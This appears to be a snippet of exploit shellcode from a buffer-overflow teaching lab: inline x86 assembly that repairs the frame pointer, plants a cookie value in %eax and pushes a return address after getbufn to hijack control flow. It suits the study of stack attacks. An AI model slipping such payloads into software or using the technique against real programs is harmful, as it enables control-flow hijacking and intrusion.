void upd() {
    __asm__ __volatile__ ("lea 0x18(%esp), %ebp\n\t" //recover ebp
    "mov $0x1507fac4, %eax\n\n" // upd eax
    "push $0x8048d0e\n\t" // next of getbufn
    "ret"  
    );
}